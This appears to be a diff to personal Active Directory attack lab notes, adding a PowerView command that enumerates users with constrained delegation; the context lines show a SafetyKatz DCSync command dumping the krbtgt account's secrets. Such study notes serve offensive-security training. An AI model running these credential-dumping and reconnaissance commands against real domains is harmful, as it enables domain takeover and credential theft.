@@ -697,3 +697,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp
    - Use the TGS for executing DCSync attack
 
 *Enumerate users in the domain for who Constrained Delegation is enabled.*
+Import powerview and use it
+```powerview
+Get-DomainUser -TrustedToAuth
+```
